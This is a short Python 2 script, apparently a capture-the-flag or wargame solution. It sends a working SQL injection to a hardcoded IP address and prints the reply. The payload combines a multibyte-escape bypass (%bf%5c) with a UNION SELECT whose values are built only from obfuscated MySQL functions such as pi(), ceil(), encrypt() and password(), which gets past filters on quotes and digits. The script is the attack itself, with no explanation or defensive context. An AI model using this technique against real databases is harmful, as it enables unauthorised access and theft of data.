import requests

exploit = "mid%28encrypt%28ceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Afloor%28pi%28%29%29%2Bceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%29%2Bceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Afloor%28pi%28%29%2Api%28%29%29%2Bceil%28pi%28%29%2Api%28%29%29%2A%28floor%28pi%28%29%2Api%28%29%29-true%29%2Cmid%28password%28true%2Btrue%29%2Cfloor%28pi%28%29%2Api%28%29%2Afloor%28pi%28%29%29%29%2Btrue%2Btrue%2Ctrue%2Btrue%29%29%2Ctrue%2C%20%28ceil%28pi%28%29%29%2Btrue%29%29"
url = "http://52.78.77.229/?id=%bf%5c&pw=%20union%20select%20"+exploit+",pi(),pi()%23"

print url
print requests.get(url).text
